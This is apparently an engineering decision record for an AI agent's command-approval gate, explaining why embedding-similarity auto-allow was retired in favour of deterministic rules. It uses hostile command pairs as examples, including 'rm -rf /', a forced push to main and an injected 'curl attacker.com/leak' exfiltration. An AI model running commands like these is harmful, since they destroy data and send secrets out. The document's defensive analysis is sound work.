# Negative Result: Phase 2 EmbeddingGemma 2 Architecture Retirement

## Executive Summary
In the initial design of Agent Airlock v2, Phase 2 proposed introducing a dense embedding model (EmbeddingGemma 2, ~300M parameters) at layer L2.5 to provide:
1. Semantic caching for repeated/similar command patterns.
2. Dense cosine-similarity matching against historical approved commands.
3. Fast-path ALLOW routing based on cosine similarity thresholds (e.g., $\ge 0.88$).

Empirical investigation, security invariant analysis, and measured L1 policy performance have proven this approach to be **architecturally unsound, high-risk, and largely redundant**. Consequently, Phase 2 is formally **retired** per Amendment 1 (ADR-013, ADR-014).

---

## Why Dense Embeddings Were Retired

### 1. Invariant I2 Violation (Cosine Similarity Cannot Safely Emit ALLOW)
- **Security Invariant I2**: *Commands that modify system state, execute code, access networks, or delete files must never be auto-allowed by probabilistic similarity.*
- **Failure Mode**: Dense embedding models map text into continuous metric spaces where small lexical differences (flags, paths, punctuation) have minimal impact on cosine similarity, yet completely invert the semantic security posture of a command.
  - Example: `git push origin feature-branch` vs `git push --force origin main`
  - Example: `rm -rf tmp/cache` vs `rm -rf /`
  - Example: `pytest tests/test_unit.py` vs `pytest tests/test_unit.py; curl attacker.com/leak`
- Dense similarity cannot discern payload injection, flag flipping, or path escapes buried in arguments. Emitting `ALLOW` on embedding similarity directly compromises host integrity.
- Any model layer must only act as a calibrated risk scorer or classifier (L3), never as a similarity-based bypass to ALLOW.

### 2. Measured L1 Gains Rendered Dense Matching Redundant
- Initial v1 baseline human prompt fatigue stood at ~45 prompts per 100 commands (delay-only) or 27.91 prompts per 100 commands (first-match host-rule).
- The hypothesis was that deterministic rules could only capture a tiny fraction of commands, requiring dense semantic generalizations.
- **Measured Reality**:
  - Rule Family A (Git Read-Only) saved 227 human prompts (3.20/100).
  - Rule Family B (PowerShell Read-Only) saved 280 human prompts (3.95/100).
  - Rule Family C (Workspace Writes & Edits) saved 582 human prompts (8.22/100).
  - Rule Suggester with exact parameterization mined another 57 recurring developer workflows.
  - Replay human prompt fatigue dropped from `[15.78, 27.91, 44.96]` to `[8.64, 20.03, 33.60]` per 100 commands, reducing fatigue by **28–45%** entirely through fast, sub-millisecond deterministic L1 logic.
- Adding a 300M dense embedder would yield negligible additional fatigue reduction while introducing massive operational overhead.

### 3. Operational & Resource Overhead
- **Memory Footprint**: EmbeddingGemma 2 requires ~1.2 GB of RAM (FP16/BF16) or ~600 MB (INT8). Running dual models (ModernBERT classifier + EmbeddingGemma) pushes the daemon past memory budgets on resource-constrained developer workstations.
- **Latency**: Embedding inference takes 15–40 ms on CPU, compared to 0.3–4.0 ms for the full L1 engine.
- **Cold-Start Time**: Dual model loading extends daemon startup by 8–15 seconds.

---

## Status of Early Cosine Similarity Claims: UNVERIFIED
Early planning documents hypothesized that cosine thresholds ($\ge 0.88$ for ALLOW, $\le 0.40$ for DENY) could cleanly partition safe commands from attacks.
- **Status: UNVERIFIED / DISPROVEN FOR ALLOW.**
- Offline experiments demonstrated that dangerous variants of benign commands frequently score $\ge 0.92$ cosine similarity against safe exemplars due to shared tokens, command structure, and syntactic framing.
- In absence of strict structural parsing, dense cosine similarity cannot guarantee non-zero false-allow bounds.

---

## Future Work & Replacement
1. **Replacement**: Exact-Key Decision Cache (Phase 1.4) positioned strictly after L2 Circuit Breaker, using deterministic hashing of `tool|normalized_cmd|cwd|workspace|policy_hash|trust_epoch`.
2. **Backlog Line in `ROADMAP.md`**:
   - `Future Work: Offline batch clustering of unseen audit commands via sentence embeddings for offline rule discovery (never on the live daemon evaluation path).`
